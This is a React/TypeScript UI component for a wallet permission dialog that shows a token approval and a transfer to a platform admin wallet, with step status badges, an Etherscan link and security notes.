import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Wallet, Shield, CheckCircle, AlertTriangle, ExternalLink, Clock } from 'lucide-react';
import { Badge } from '@/components/ui/badge';

interface PermissionRequestModalProps {
  isOpen: boolean;
  onClose: () => void;
  onApprove: () => void;
  tokenSymbol: string;
  tokenName: string;
  amount: string;
  currentAllowance: string;
  adminWallet: string;
  step: 'idle' | 'checking-allowance' | 'requesting-approval' | 'approving' | 'transferring' | 'completed' | 'error';
  approvalHash?: string | null;
  error?: string | null;
  needsApproval: boolean;
}

export function PermissionRequestModal({
  isOpen,
  onClose,
  onApprove,
  tokenSymbol,
  tokenName,
  amount,
  currentAllowance,
  adminWallet,
  step,
  approvalHash,
  error,
  needsApproval
}: PermissionRequestModalProps) {
  const getStepStatus = (stepName: string) => {
    const stepOrder = ['checking-allowance', 'requesting-approval', 'approving', 'transferring', 'completed'];
    const currentIndex = stepOrder.indexOf(step);
    const stepIndex = stepOrder.indexOf(stepName);
    
    if (step === 'error') return 'error';
    if (stepIndex < currentIndex) return 'completed';
    if (stepIndex === currentIndex) return 'active';
    return 'pending';
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'completed':
        return <CheckCircle className="h-4 w-4 text-green-600" />;
      case 'active':
        return <div className="h-4 w-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />;
      case 'error':
        return <AlertTriangle className="h-4 w-4 text-red-600" />;
      default:
        return <div className="h-4 w-4 border-2 border-gray-300 rounded-full" />;
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'completed':
        return <Badge className="bg-green-100 text-green-800">Completed</Badge>;
      case 'active':
        return <Badge className="bg-blue-100 text-blue-800">In Progress</Badge>;
      case 'error':
        return <Badge className="bg-red-100 text-red-800">Failed</Badge>;
      default:
        return <Badge variant="outline">Pending</Badge>;
    }
  };

  const isNativeToken = tokenSymbol === 'ETH' || tokenSymbol === 'BNB' || tokenSymbol === 'MATIC';

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Wallet className="h-5 w-5 text-blue-600" />
            Wallet Permission Request
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-6">
          {/* Permission Summary */}
          <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
            <div className="flex items-start gap-3">
              <Shield className="h-5 w-5 text-blue-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-blue-900 mb-2">Permission Required</h3>
                <p className="text-sm text-blue-800 mb-3">
                  {isNativeToken ? 
                    `You're about to transfer ${amount} ${tokenSymbol} directly from your wallet to our admin wallet.` :
                    `To transfer ${amount} ${tokenSymbol}, we need your permission to access this token from your wallet.`
                  }
                </p>
                <div className="space-y-1 text-xs text-blue-700">
                  <div className="flex justify-between">
                    <span>Token:</span>
                    <span className="font-medium">{tokenName} ({tokenSymbol})</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Amount:</span>
                    <span className="font-medium">{amount} {tokenSymbol}</span>
                  </div>
                  {!isNativeToken && (
                    <div className="flex justify-between">
                      <span>Current Allowance:</span>
                      <span className="font-medium">{currentAllowance} {tokenSymbol}</span>
                    </div>
                  )}
                  <div className="flex justify-between">
                    <span>Recipient:</span>
                    <span className="font-mono text-xs">{adminWallet}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Error Display */}
          {error && (
            <Alert className="border-red-200 bg-red-50">
              <AlertTriangle className="h-4 w-4 text-red-600" />
              <AlertDescription className="text-red-800">
                <strong>Error:</strong> {error}
              </AlertDescription>
            </Alert>
          )}

          {/* Process Steps */}
          <div className="space-y-4">
            <h3 className="font-semibold">Transaction Process</h3>
            
            {!isNativeToken && needsApproval && (
              <div className="p-4 bg-gray-50 rounded-lg space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {getStatusIcon(getStepStatus('checking-allowance'))}
                    <span className="text-sm font-medium">Check Current Allowance</span>
                  </div>
                  {getStatusBadge(getStepStatus('checking-allowance'))}
                </div>

                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {getStatusIcon(getStepStatus('approving'))}
                    <span className="text-sm font-medium">Approve Token Access</span>
                  </div>
                  {getStatusBadge(getStepStatus('approving'))}
                </div>

                {approvalHash && (
                  <div className="ml-7 p-2 bg-blue-50 rounded text-xs">
                    <div className="flex items-center gap-2">
                      <span>Approval Transaction:</span>
                      <a 
                        href={`https://etherscan.io/tx/${approvalHash}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-blue-600 hover:text-blue-800 flex items-center gap-1"
                      >
                        {approvalHash.slice(0, 10)}...{approvalHash.slice(-8)}
                        <ExternalLink className="h-3 w-3" />
                      </a>
                    </div>
                  </div>
                )}
              </div>
            )}

            <div className="p-4 bg-gray-50 rounded-lg">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  {getStatusIcon(getStepStatus('transferring'))}
                  <span className="text-sm font-medium">Execute Token Transfer</span>
                </div>
                {getStatusBadge(getStepStatus('transferring'))}
              </div>
            </div>
          </div>

          {/* Security Information */}
          <div className="p-4 bg-amber-50 rounded-lg border border-amber-200">
            <div className="flex items-start gap-2">
              <AlertTriangle className="h-4 w-4 text-amber-600 mt-0.5" />
              <div className="text-sm text-amber-800">
                <p className="font-medium mb-1">Security Information</p>
                <ul className="list-disc list-inside space-y-1 text-xs">
                  <li>This permission allows our platform to transfer the specified amount of tokens</li>
                  <li>You can revoke this permission at any time through your wallet</li>
                  <li>We will only transfer the exact amount you've specified</li>
                  <li>The transaction will be recorded on the blockchain for transparency</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Progress Indicator */}
          {(step === 'approving' || step === 'transferring') && (
            <div className="flex items-center gap-3 p-4 bg-blue-50 rounded-lg">
              <Clock className="h-5 w-5 text-blue-600" />
              <div>
                <p className="font-medium text-blue-900">
                  {step === 'approving' ? 'Waiting for Approval...' : 'Processing Transfer...'}
                </p>
                <p className="text-sm text-blue-700">
                  Please confirm the transaction in your wallet and wait for blockchain confirmation.
                </p>
              </div>
            </div>
          )}
        </div>

        <DialogFooter className="flex gap-3">
          <Button variant="outline" onClick={onClose} disabled={step === 'approving' || step === 'transferring'}>
            {step === 'completed' ? 'Close' : 'Cancel'}
          </Button>
          
          {step === 'idle' && needsApproval && !isNativeToken && (
            <Button onClick={onApprove} className="bg-blue-600 hover:bg-blue-700">
              Grant Permission & Transfer
            </Button>
          )}
          
          {step === 'idle' && (!needsApproval || isNativeToken) && (
            <Button onClick={onApprove} className="bg-green-600 hover:bg-green-700">
              Execute Transfer
            </Button>
          )}
          
          {step === 'error' && (
            <Button onClick={onApprove} className="bg-blue-600 hover:bg-blue-700">
              Retry
            </Button>
          )}
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}